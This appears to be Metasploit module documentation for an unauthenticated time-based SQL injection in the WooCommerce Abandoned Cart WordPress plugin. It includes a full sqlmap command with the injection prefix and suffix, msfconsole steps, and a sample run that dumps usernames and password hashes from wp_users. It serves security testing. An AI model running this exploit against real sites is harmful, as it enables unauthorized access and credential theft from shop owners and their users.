## Vulnerable Application

Abandoned Cart, a plugin for WordPress which extends the WooCommerce plugin,
prior to 5.8.2 is affected by an unauthenticated SQL injection via the
billing_first_name parameter of the save_data AJAX call.  A valid
wp_woocommerce_session cookie is required, which has at least one item in the
cart.

The plugin can be downloaded from
[here](https://downloads.wordpress.org/plugin/woocommerce-abandoned-cart.5.8.1.zip)

You'll need to first install WooCommerce and set up a shop with at least one item.
Next, install and activate Abandoned Cart.

This module slightly replicates sqlmap running as:

```
sqlmap -u http://local.target/wp-admin/admin-ajax.php --cookie='[cookies content here]' --method='POST' --data='billing_first_name=wpdeeply&billing_last_name=wpdeeply&billing_company=wpdeeply&billing_address_1=wpdeeply&billing_address_2=wpdeeply&billing_city=wpdeeply&billing_state=wpdeeply&billing_postcode=123234&billing_country=GB&billing_phone=12324&billing_email=wpdeeply%40protonmail.com&order_notes=&wcal_guest_capture_nonce=[nonce-value]&action=save_data' -p billing_first_name --prefix="', '', '','', '',( TRUE " --suffix=")) -- wpdeeply" --dbms mysql --technique=T --time-sec=1
```

## Verification Steps

1. Install the plugin on wordpress
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_abandoned_cart_sqli`
1. Do: `set rhosts [ip]`
1. Do: `set cookie [cookie]`
1. Do: `run`
1. You should get username and password hashes.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COOKIE

A valid `wp_woocommerce_session` cookie, which has at least 1 item in the cart.  An example is:
`wp_woocommerce_session_d2959e58288b6133e71de74309fcabfb=257056469b604b6a005c25ea293c83f9%7C%7C1609808347%7C%7C1609804747%7C%7C499137359f4d8c16f125fba6cf58ff57`.

### COUNT

If Action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### Wordpress 5.4.2 with WooCommerce 4.8.0 and Abandoned Cart 5.8.1 on Ubuntu 20.04 using MariaDB 10.3.22

```
resource (abandoned.rb)> use auxiliary/scanner/http/wp_abandoned_cart_sqli
resource (abandoned.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (abandoned.rb)> set verbose true
verbose => true
resource (abandoned.rb)> set cookie "wp_woocommerce_session_d2959e58288b6133e71de74309fcabfb=257056469b604b6a005c25ea293c83f9%7C%7C1609808347%7C%7C1609804747%7C%7C499137359f4d8c16f125fba6cf58ff57"
cookie => wp_woocommerce_session_d2959e58288b6133e71de74309fcabfb=257056469b604b6a005c25ea293c83f9%7C%7C1609808347%7C%7C1609804747%7C%7C499137359f4d8c16f125fba6cf58ff57
resource (abandoned.rb)> set count 3
count => 3
resource (abandoned.rb)> run
[*] Checking /wp-content/plugins/woocommerce-abandoned-cart/readme.txt
[*] Found version You in the plugin
[+] Vulnerable version detected
[*] Nonce: b56eb3a2cb
[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(PghfuFZ) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) PghfuFZ from wp_users limit 3) eOMLbNMh)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_abandoned_cart_sqli) > creds
Credentials
===========

host  origin         service  public  private                             realm  private_type        JtR Format
----  ------         -------  ------  -------                             -----  ------------        ----------
      111.111.1.111           admin2  $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1         Nonreplayable hash  phpass
      111.111.1.111           editor  $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/         Nonreplayable hash  phpass
      111.111.1.111           admin   $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0         Nonreplayable hash  phpass
```
